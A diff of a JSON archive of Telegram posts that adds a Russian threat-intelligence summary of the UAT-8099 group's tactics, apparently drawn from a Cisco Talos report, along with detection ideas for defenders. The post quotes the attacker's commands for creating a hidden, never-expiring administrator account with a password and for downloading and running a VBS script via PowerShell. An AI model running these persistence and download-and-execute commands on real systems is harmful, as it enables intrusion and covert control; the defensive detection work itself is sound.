@@ -1,8 +1,15 @@
 {
   "channel": "detectioneasy",
-  "last_update": "2026-02-17T14:54:09.791483+00:00",
-  "messages_count": 55,
+  "last_update": "2026-02-17T19:06:49.922920+00:00",
+  "messages_count": 56,
   "messages": [
+    {
+      "id": "317",
+      "title": "Cisco Talos опубликовали отчет о TTP группировки UAT-8099",
+      "text": "Всем привет! 💻✌️\nCisco Talos опубликовали отчет о TTP группировки UAT-8099\n👨‍💻 Как это работает?\n🔤 После получения доступа выполняют команды для анализа хоста - whoami, tasklist\n🔤 Для закрепления устанавливают SoftEther VPN и создают учетную запись, маскирующуюся под сервисную, mssql$ (в дальнейшем логин менялся, однако IOA оставался тем же)\ncmd /c net user mssql$ AppleHuitar7$ /add\ncmd /c net localgroup administrators mssql$ /add\ncmd /c net user mssql$ /expires:never\n🔤 Один из инструментов атакующих - GotoHTTP\nЗагружают через PowerShell Invoke-WebRequest https://.*/*.vbs\nи запускают cmd /c C:\\Users\\Public\\zcgo1.vbs\n🔤 Конечная цель атакующих — внедрение кода в IIS\n🔭 Обнаружение:\n🔤 отслеживаем запуск whoami и net user|localgroup\n🔤 хантим и отслеживаем создание пользовательских учетных записей с последним символом $\n🔤 отслеживаем EventId=4624 and LogonType in [3, 10] and TargetUserName endswith $\n🔤 мониторим использование RMM Tool\n🔤 отслеживаем запуск дочерних процессов (cmd.exe, powershell.exe, etc) от родителя w3wp.exe\n🔤 отслеживаем создание новых *.aspx\n🔤 создание странных файлов в C:\\Users\\Public\n#detection@detectioneasy\n#ttp@detectioneasy",
+      "link": "https://t.me/detectioneasy/317",
+      "pub_date": "2026-02-17T18:31:04+00:00"
+    },
     {
       "id": "316",
       "title": "После месячной раскачки — возвращаемся к практике",
